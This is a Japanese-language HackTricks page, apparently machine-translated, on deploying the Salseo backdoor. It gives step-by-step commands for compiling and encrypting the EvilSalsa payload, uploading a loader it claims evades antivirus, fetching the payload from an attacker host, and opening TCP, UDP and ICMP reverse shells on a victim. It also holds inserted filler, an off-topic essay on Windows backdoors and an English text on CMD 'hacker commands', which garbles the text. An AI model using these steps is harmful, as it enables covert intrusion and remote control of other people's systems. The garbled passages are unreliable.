# Salseo

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## バイナリのコンパイル

githubからソースコードをダウンロードし、**EvilSalsa**と**SalseoLoader**をコンパイルします。コードをコンパイルするには**Visual Studio**が必要です。

これらのプロジェクトを、使用するWindowsボックスのアーキテクチャに合わせてコンパイルしてください（Windowsがx64をサポートしている場合は、そのアーキテクチャにコンパイルします）。

Visual Studio内で、**左側の"Build"タブ**の**"Platform Target"**でアーキテクチャを**選択**できます。

(\*\*このオプションが見つからない場合は、**"Project Tab"**を押し、次に**"\<Project Name> Properties"**を押します)

![](<../.gitbook/assets/image (132).png>)

次に、両方のプロジェクトをビルドします（Build -> Build Solution）（ログ内に実行可能ファイルのパスが表示されます）：

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## バックドアの準備

まず、**EvilSalsa.dll**をエンコードする必要があります。これには、pythonスクリプト**encrypterassembly.py**を使用するか、プロジェクト**EncrypterAssembly**をコンパイルすることができます：

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

Windows（ウィンドウズ）は、マイクロソフトが開発したオペレーティングシステムです。Windowsには、バックドアを作成するためのさまざまな方法があります。

#### リモートデスクトップ

リモートデスクトップは、Windowsの標準機能であり、リモートでコンピュータにアクセスするための便利な方法です。しかし、この機能は悪意のあるユーザーにとっても便利なツールとなり得ます。攻撃者は、リモートデスクトップを使用してバックドアを作成し、ターゲットマシンにアクセスすることができます。

#### サービス

Windowsでは、サービスと呼ばれるバックグラウンドプロセスを作成することができます。これらのサービスは、システムの起動時に自動的に実行され、バックドアとして機能することができます。攻撃者は、悪意のあるサービスを作成し、ターゲットマシンにバックドアを設置することができます。

#### レジストリ

Windowsのレジストリは、システムの設定情報を格納するデータベースです。攻撃者は、レジストリを使用してバックドアを作成し、システムの起動時に自動的に実行されるようにすることができます。これにより、攻撃者はターゲットマシンにアクセスし、制御することができます。

#### シェル拡張

Windowsでは、シェル拡張を使用してバックドアを作成することもできます。シェル拡張は、エクスプローラウィンドウの右クリックメニューに追加されるカスタムコマンドです。攻撃者は、シェル拡張を使用してバックドアを作成し、ターゲットマシンにアクセスすることができます。

これらは、Windowsでバックドアを作成するための一般的な方法のいくつかです。攻撃者はこれらの方法を使用して、ターゲットマシンに不正アクセスすることができます。セキュリティを強化するためには、これらの方法を理解し、適切な対策を講じる必要があります。
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
よし、これでSalseoのすべてを実行するために必要なものが揃いました: **エンコードされたEvilDalsa.dll**と**SalseoLoaderのバイナリ**です。

**SalseoLoader.exeバイナリをマシンにアップロードしてください。どのAVにも検出されないはずです...**

## **バックドアの実行**

### **TCPリバースシェルの取得（HTTPを介してエンコードされたdllをダウンロード）**

リバースシェルリスナーとHTTPサーバーを起動して、エンコードされたevilsalsaを提供することを忘れないでください。
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDPリバースシェルの取得（SMBを介してエンコードされたdllをダウンロードする）**

リバースシェルのリスナーとしてncを起動し、エンコードされたevilsalsaを提供するためのSMBサーバー（impacket-smbserver）を起動することを忘れないようにしてください。
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMPリバースシェルの取得（既に被害者内にエンコードされたdllが存在する場合）**

**今回は、クライアント側でリバースシェルを受け取るための特別なツールが必要です。ダウンロードしてください：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP応答の無効化：**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### クライアントを実行する:

```bash
./client
```

The client will connect to the server and wait for commands.
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### ターゲット内部で、salseoの実行を行います：
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## DLLのエクスポートメイン関数としてSalseoLoaderをコンパイルする

Visual Studioを使用してSalseoLoaderプロジェクトを開きます。

### メイン関数の前に\[DllExport]を追加します

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png>)

### このプロジェクトにDllExportをインストールします

#### **ツール** --> **NuGetパッケージマネージャー** --> **ソリューションのNuGetパッケージを管理...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png>)

#### **DllExportパッケージを検索（ブラウズタブを使用）し、インストールボタンを押します（ポップアップを受け入れます）**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)

プロジェクトフォルダには、**DllExport.bat**と**DllExport\_Configure.bat**のファイルが表示されます。

### DllExportをアンインストールします

**アンインストール**を押します（はい、奇妙ですが、信じてください、必要です）

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### Visual Studioを終了し、DllExport\_configureを実行します

Visual Studioを**終了**します

次に、**SalseoLoaderフォルダ**に移動し、**DllExport\_Configure.bat**を実行します

**x64**を選択します（x64ボックス内で使用する場合、私の場合はそうでした）、**System.Runtime.InteropServices**（**DllExportの名前空間内**）を選択し、**Apply**を押します

![](<../.gitbook/assets/image (7) (1) (1) (1).png>)

### Visual Studioでプロジェクトを再度開きます

**\[DllExport]**はもはやエラーとしてマークされません

![](<../.gitbook/assets/image (8) (1).png>)

### ソリューションをビルドします

**出力の種類 = クラスライブラリ**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> アプリケーション --> 出力の種類 = クラスライブラリ）

![](<../.gitbook/assets/image (10) (1).png>)

**x64プラットフォーム**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> ビルド --> プラットフォームターゲット = x64）

![](<../.gitbook/assets/image (9) (1) (1).png>)

ソリューションをビルドするには：ビルド --> ソリューションのビルド（出力コンソールに新しいDLLのパスが表示されます）

### 生成されたDLLをテストします

テストしたい場所にDLLをコピーして貼り付けます。

実行します：
```
rundll32.exe SalseoLoader.dll,main
```
エラーが表示されない場合、おそらく機能するDLLを持っています！

## DLLを使用してシェルを取得する

**HTTPサーバー**を使用して、**ncリスナー**を設定することを忘れないでください。

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a text-based interface for executing commands and managing the system. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.

CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By exploiting vulnerabilities or using social engineering techniques, hackers can gain access to a system and use CMD to perform malicious activities.

Some common CMD commands used by hackers include:

- **netstat**: This command displays active network connections and listening ports on a system. Hackers can use this command to gather information about a target's network and identify potential entry points.

- **ipconfig**: This command displays the IP configuration of a system, including the IP address, subnet mask, and default gateway. Hackers can use this command to gather information about a target's network and identify potential vulnerabilities.

- **tasklist**: This command displays a list of running processes on a system. Hackers can use this command to identify processes that may be vulnerable to exploitation or to gather information about running applications.

- **regedit**: This command opens the Windows Registry Editor, which allows hackers to modify registry keys and values. By modifying registry settings, hackers can gain persistence on a compromised system or disable security features.

- **shutdown**: This command allows hackers to shut down or restart a target system. By executing this command, hackers can disrupt the normal operation of a system or cause denial of service.

It is important to note that the use of CMD for malicious purposes is illegal and unethical. This information is provided for educational purposes only, to raise awareness about potential security risks and to promote responsible and ethical use of technology.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
